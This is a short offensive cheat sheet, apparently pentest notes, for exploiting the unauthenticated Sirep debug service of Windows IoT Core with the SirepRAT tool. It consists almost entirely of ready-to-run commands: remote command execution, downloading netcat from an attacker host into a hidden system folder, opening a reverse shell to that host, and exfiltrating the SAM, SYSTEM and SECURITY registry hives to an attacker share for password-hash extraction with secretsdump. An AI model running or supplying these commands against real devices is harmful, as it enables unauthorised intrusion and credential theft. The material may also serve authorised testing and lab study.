# Windows IoT SirepRAT RCE

Windows IoT Core exposes a debug interface (Sirep protocol) on TCP 29820 that allows unauthenticated command execution.

```bash
git clone https://github.com/SafeBreach-Labs/SirepRAT
python SirepRAT.py <TARGET> LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" --args '/c whoami'
```

**Upload file (use Invoke-WebRequest):**
```bash
python SirepRAT.py <TARGET> LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" \
  --args '/c powershell Invoke-WebRequest -outfile C:\windows\system32\spool\drivers\color\nc.exe -uri http://<LHOST>/nc64.exe'
```

**Get shell:**
```bash
python SirepRAT.py <TARGET> LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" \
  --args '/c C:\windows\system32\spool\drivers\color\nc.exe -e cmd <LHOST> <LPORT>'
```

**Dump registry hives (then secretsdump.py):**
```bash
# --args '/c reg save HKLM\sam \\<LHOST>\share\sam'
# --args '/c reg save HKLM\system \\<LHOST>\share\system'
# --args '/c reg save HKLM\security \\<LHOST>\share\security'
secretsdump.py -sam sam -security security -system system LOCAL
```
